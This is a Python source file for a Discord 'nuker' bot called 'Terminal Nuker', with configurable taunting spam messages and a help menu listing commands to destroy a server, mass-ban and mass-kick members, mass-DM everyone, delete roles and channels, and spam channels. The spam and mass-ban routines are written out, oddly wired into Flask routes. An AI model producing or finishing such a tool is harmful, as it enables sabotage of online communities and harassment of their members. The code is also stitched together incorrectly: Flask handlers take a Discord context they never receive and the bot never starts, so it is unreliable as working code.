from flask import Flask, request, jsonify
import os
import colorama
from colorama import Fore
import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

app = Flask(__name__)

###########SETUP###############
prefix = "?"                                                    #
token = "token"                                            #
spam_messages = "QUALIFY NUKED YOU CLOWNS @here"         #
massdm = "THIS SERVER GOT NUKED BY QUALIFIER"                    #
rolenames = "UR A CLOWN"         #                                                            
channels = "LMAOO CLOWNS"  #
##############################

def Clear():
    os.system('cls')


bot = commands.Bot(command_prefix=prefix)
bot.remove_command("help")


os.system('cls' if os.name == 'nt' else 'clear')
@bot.event
async def on_ready():
    Clear()

    print(f'''{Fore.CYAN}
 ______   ______     ______     __    __     __     __   __     ______     __        
/\__  _\ /\  ___\   /\  == \   /\ "-./  \   /\ \   /\ "-.\ \   /\  __ \   /\ \       
\/_/\ \/ \ \  __\   \ \  __<   \ \ \-./\ \  \ \ \  \ \ \-.  \  \ \  __ \  \ \ \____  
   \ \_\  \ \_____\  \ \_\ \_\  \ \_\ \ \_\  \ \_\  \ \_\\"\_\  \ \_\ \_\  \ \_____\ 
    \/_/   \/_____/   \/_/ /_/   \/_/  \/_/   \/_/   \/_/ \/_/   \/_/\/_/   \/_____/ 
                                                                                     
------------------------------------------------------------------ Nuker Is Online <$
    ''' + Fore.RESET)


#help command
@bot.command()
async def help(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_author(name=" 🌠 Terminal Nuker")
        embed.add_field(name="`NUKE`", value="- destroys the server")
        embed.add_field(name="`SPAM`", value="- spams the server")
        embed.add_field(name="`BAN`", value="- bans all members in the server")
        embed.add_field(name="`KICK`", value="- kicks all members in the server")
        embed.add_field(name="`MASSDM {MSG}`", value="- dms everyone in the server with the message provided")
        embed.add_field(name="`SNAME`", value="- changes the server name!")
        embed.add_field(name="`ROLES`", value="- deletes all roles in the server, and creates new ones")
        embed.add_field(name="`DCHANNELS`", value="- deletes all channels in the server")
        embed.add_field(name="`SCHANNELS`", value="- spams channels in the server")
        embed.set_image(url="")
        await ctx.send(embed=embed)


#commands  

@app.route('/spam', methods=['POST'])
async def spam(ctx):
    data = request.json
    guild = ctx.guild
    for channel in guild.text_channels:
        await channel.send(data['spam'])
    return jsonify({'message': 'Spamming initiated!'}), 200


@app.route('/ban', methods=['POST'])
async def ban(ctx):
    guild = ctx.guild
    for member in list(ctx.guild.members):
        try:
            await guild.ban(member)
            print("User" + member.name + "Has Been  Banned")
        except:
            pass
    return jsonify({'message': 'Banned all!'}), 200

# Implement other commands similarly

if __name__ == "__main__":
    app.run(debug=True)
